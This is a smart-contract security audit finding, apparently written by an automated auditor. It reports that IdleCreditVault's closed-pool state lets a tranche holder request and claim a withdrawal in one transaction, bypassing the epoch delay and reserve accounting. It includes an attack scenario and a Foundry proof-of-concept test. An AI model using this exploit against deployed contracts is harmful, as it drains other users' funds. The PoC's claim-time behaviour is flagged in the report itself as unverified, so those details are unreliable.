### Title
Closed-pool withdraw requests bypass the one-epoch delay and the `pendingWithdraws` reserve accounting, letting a tranche holder drain funded receipts of other users - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
Analogous to the TermMaxVault `submitMarket` timelock that set `validAt = 0` (delay never applied), `IdleCreditVault.requestWithdraw` skips both the pending-withdrawal reserve accounting and the mandatory one-epoch wait whenever `IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0` — i.e. a closed pool (post `_emergencyShutdown`/repay-all stop) or the pre-first-epoch buffer. The claim-side gate in `_claimFundedWithdrawRequest` is conditioned on the same `epochEndDate() != 0` check, so the delay silently collapses to zero in exactly the same state where the reserve accounting is skipped. A tranche holder can therefore `requestWithdraw` + `claimWithdrawRequest` in a single transaction and be paid out of the vault's underlying balance, which holds funds reserved for earlier funded withdraw receipts, funded instant withdrawals, and `defaultRecoveryReserve`.

### Finding Description
In `requestWithdraw` (IdleCreditVault.sol:259-294):

```solidity
bool isClosed = IIdleCDOEpochVariant(idleCDO).epochEndDate() == 0;
...
if (!isClosed) {
  // Global amount that stopEpoch must source from borrower/strategy for all pending receipts.
  pendingWithdraws += _amount;
}
lastWithdrawRequest[_user] = currentEpoch;
```

When `isClosed` is true the new receipt is recorded in `withdrawsRequests[_user]` and strategy tokens are minted to the user, but `pendingWithdraws` is not increased — the request is invisible to the reserve that `collectWithdrawFunds` sizes.

In `_claimFundedWithdrawRequest` (IdleCreditVault.sol:326):

```solidity
if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
  revert NotAllowed();
}
```

The one-epoch delay is only enforced while `epochEndDate != 0`. In the closed-pool state both checks short-circuit, so `requestWithdraw` immediately followed by `claimWithdrawRequest` succeeds in the same block: the receipt is burned and `_transferFundedClaim` sends underlying out of the strategy's token balance.

Withdraw requests remain enabled in this state: `_emergencyShutdown`/`restoreOperations` set `allowAAWithdrawRequest = true` and `allowBBWithdrawRequest = true` with `epochEndDate = 0` (IdleCDOEpochVariant.sol:217-223). The strategy at that point holds underlying earmarked for (a) earlier funded `pendingWithdraws` receipts not yet claimed, (b) instant-withdraw funding pulled via `collectInstantWithdrawFunds`, and (c) `defaultRecoveryReserve`. None of these balances are segregated from the pot `_transferFundedClaim` pays out of, and the attacker's claim was never added to `pendingWithdraws`, so the payout is not backed by any accounting entry — it is pure dilution of other users' reserved claims.

**Scenario:**
- Epoch N stops with user A's funded withdraw receipt sitting unclaimed; the borrower repaid and `collectWithdrawFunds` moved A's funds into the strategy (`pendingWithdraws` > 0, vault balance covers it).
- Owner/manager closes the pool (`_interest == 1` repay-all / emergency path): `epochEndDate` is set to 0.
- Attacker B, an ordinary AA or BB tranche holder, calls `requestWithdraw` — `pendingWithdraws` is not incremented.
- B calls `claimWithdrawRequest` in the same transaction; the `epochEndDate != 0` gate is skipped and B is paid from the strategy balance.
- A later claims; the vault is short by B's payout and A's transfer fails or A receives less than the funded amount. The invariant "one receipt, one payout backed by `pendingWithdraws`/reserve" is broken.

### Impact Explanation
Direct theft / permanent freezing of other users' funded withdrawal claims: the attacker extracts underlying that was already sourced from the borrower for earlier receipts, leaving `pendingWithdraws` undercollateralized. The loss equals the attacker's claimed amount (up to the strategy's liquid balance), borne entirely by users whose funded receipts can no longer be paid.

### Likelihood Explanation
Deterministic whenever the pool enters the closed state while the strategy still holds unclaimed funded receipts or instant-withdraw funding — a routine end-of-life state. Any unprivileged tranche holder can execute it atomically; no privileged cooperation is required.

### Recommendation
Make the delay and reserve accounting state-independent. In `requestWithdraw`, either revert when `isClosed` or still account for the claim (e.g., increment a dedicated claimable bucket rather than silently skipping `pendingWithdraws`). In `_claimFundedWithdrawRequest`, enforce the epoch delay regardless of `epochEndDate`, or deduct the payout from the tracked reserve so the vault balance cannot fall below outstanding funded receipts plus `defaultRecoveryReserve`.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";
import {IdleCreditVault} from "contracts/strategies/idle/IdleCreditVault.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";

contract ClosedPoolDelayBypassTest is Test {
    // Reuses the repo's existing IdleCreditVault.t.sol harness helpers:
    // _depositWithUser, _startEpochAndCheckPrices, _stopEpochAndCheckPrices,
    // cdoEpoch, strategy (IdleCreditVault), AAtranche, underlying, manager.

    function testClosedPoolRequestClaimSameTxDrainsReserve() external {
        IdleCreditVault vault = IdleCreditVault(address(strategy));
        IERC20Detailed underlying = IERC20Detailed(vault.token());
        address userA = makeAddr("userA");
        address attacker = makeAddr("attacker");

        // epoch 0: A and attacker deposit
        uint256 trA = _depositWithUser(userA, 100e6);
        uint256 trB = _depositWithUser(attacker, 100e6);

        _startEpochAndCheckPrices(0);            // epoch 0 running
        vm.prank(userA);
        cdoEpoch.requestWithdraw(trA, address(AAtranche)); // A requests, waits one epoch
        _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());
        // A's receipt is funded: underlying sits in `strategy`, pendingWithdraws > 0

        // Manager/owner closes the pool (repay-all / emergency): epochEndDate -> 0,
        // allowAAWithdrawRequest stays true
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(0, 1);    // or _emergencyShutdown path

        assertEq(cdoEpoch.epochEndDate(), 0);

        uint256 pendingBefore = vault.pendingWithdraws();
        uint256 balPre = underlying.balanceOf(attacker);

        vm.startPrank(attacker);
        cdoEpoch.requestWithdraw(trB, address(AAtranche));
        cdoEpoch.claimWithdrawRequest();         // same tx, no epoch wait
        vm.stopPrank();

        // Attacker was paid but pendingWithdraws never grew for his receipt
        assertEq(vault.pendingWithdraws(), pendingBefore, "attacker receipt escaped reserve accounting");
        assertGt(underlying.balanceOf(attacker), balPre, "attacker paid instantly");

        // Victim's funded receipt is now undercollateralized
        vm.prank(userA);
        vm.expectRevert();                        // vault balance short -> transfer fails
        cdoEpoch.claimWithdrawRequest();
    }
}
```

Note: this PoC assumes `_transferFundedClaim` pays from the strategy's aggregate underlying balance without re-checking per-receipt backing; the full body of that helper and `stopEpochWithDuration`'s close-pool path were not fully read within the available iterations, so the exact revert/underflow behavior at claim time should be confirmed when writing the final test. The accounting asymmetry itself (receipt minted without `pendingWithdraws` increment, delay gate skipped when `epochEndDate == 0`) is directly visible at `IdleCreditVault.sol:259-295` and `IdleCreditVault.sol:326-328`.
